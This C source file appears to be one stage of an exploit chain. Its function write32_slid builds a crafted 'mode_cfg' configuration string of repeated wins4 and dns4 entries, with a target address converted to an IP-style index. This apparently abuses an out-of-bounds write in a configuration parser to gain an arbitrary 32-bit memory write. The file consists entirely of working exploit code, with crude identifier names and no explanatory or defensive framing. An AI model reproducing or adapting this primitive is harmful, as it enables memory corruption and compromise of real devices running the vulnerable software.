/*
 *  stage0_primitives
 */

#include <stdint.h>
#include <stdio.h>

#include "stage0_primitives.h"
#include "ip_tools.h"
#include "common.h"
#include <string.h>
#include "shit.h"

//#define DNS4_OFFSET 0xb6c10

char* write32_slid(uint32_t where,
				   uint32_t what) {
	char* where_ip = NULL;
	char* what_ip = NULL;
	char* ret = NULL;

    uint32_t where_ = where - DNS4_OFFSET;
    where_ >>= 2;
    where_ += 0x80000000;
	
	where_ip = uint32_t_to_ip(where_);
	what_ip = uint32_t_to_ip(what);

	asprintf(&ret,	"mode_cfg{"
					"wins41.3.3.7;"
					"wins41.3.3.7;"
					"wins41.3.3.7;"
					"wins41.3.3.7;"
					"wins4255.255.255.255;"
					"wins4%s;"
					"dns4%s;"
					"}",
			 where_ip,
			 what_ip);
	
	strcpy(fuck_memory_leaks, ret);

	free(ret);

	return fuck_memory_leaks;
}